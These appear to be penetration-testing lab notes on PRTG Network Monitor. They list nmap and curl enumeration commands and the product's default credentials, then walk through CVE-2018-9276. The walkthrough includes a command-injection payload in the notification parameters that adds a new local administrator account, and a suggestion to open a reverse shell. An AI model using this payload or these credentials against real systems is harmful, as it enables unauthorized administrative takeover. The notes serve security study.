https://www.paessler.com/prtg
* Agent-less network monitor software
* Can monitor bandwidth usage, uptime
* Collect statistics from various hosts such as routers, switches, servers and more. 
* Rare to see it exposed externally 
# Discovering and Enumeration
* Found on common web ports
```shell
sudo nmap -sV -p- --open -T4 10.129.201.50
```
* Service Version will look similar to: `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)`
* Default Creds are `prtgadmin:prtgadmin`
```shell
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```
# Leveraging Known Vulnerabilities 
### CVE-2018-9276
* Before version 18.2.39
* `Setup > Account Settings > Notifications > Add New notifications`
* Give the notification a name
* Tick `Execute Program`
* `Program File > Demo exe Notification`
In the paramters
```
`test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`
```
This will add a new local admin. Maybe do a reverse shell?
* Click save
* Can schedule this to run . 
* Click Test.
* This is a blind injection. 
* 
